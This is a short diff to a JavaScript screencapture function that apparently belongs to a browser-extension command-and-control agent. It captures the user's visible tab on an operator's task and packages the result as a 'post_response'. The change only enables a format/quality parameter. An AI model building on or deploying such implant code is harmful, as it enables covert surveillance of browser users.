@@ -1,10 +1,10 @@
 exports.screencapture = function(task){
     try {
-        /*let param = {
+        let param = {
             'format': 'png',
-            'quality': 100
-        };*/
-        chrome.tabs.captureVisibleTab(null, function(img) {
+            'quality': 75
+        };
+        chrome.tabs.captureVisibleTab(param, function(img) {
             if (img === undefined) {
                 let response = {'task_id':task.id, 'user_output': 'screencapture failed', 'completed': false, 'status':'error'};
                 let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
